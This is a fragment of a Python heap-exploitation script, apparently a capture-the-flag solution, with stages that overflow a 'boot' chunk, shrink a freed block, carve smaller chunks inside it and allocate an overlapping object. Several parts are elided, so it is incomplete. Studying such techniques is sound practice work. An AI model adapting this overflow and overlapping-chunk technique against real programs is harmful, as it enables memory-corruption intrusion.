...
def stage_1_create_large_boots(target):
    #for debugging, lets read the boots here after stage
    create_new_boot(target, 0x88, 'AAAAA') #allocation for A
...
def stage_2_create_and_shrink(target):
    ...
    edit_boot(target, 0, 0x70*'A'+ p64(0x200)) #overflow
    #edit_boot(target, 0, 0x100*'A')# + p64(0x0A)) #overflow
    #delete_boot(target, 0)
    #create_new_boot(target, 0x100, 0x100*'A'+ '\x00')
...
def stage_3_make_smaller_chunks_in_freed_block(target):
    #for debugging, lets read the boots here after stage
    create_new_boot(target, 0x40, '1'*0x20) #B1 allocation
    create_new_boot(target, 0x40, '2'*0x20) #B2 allocation
...
def stage_5_create_overlapping_object(target):
    create_new_boot(target, 0x300, '6'*0x100)
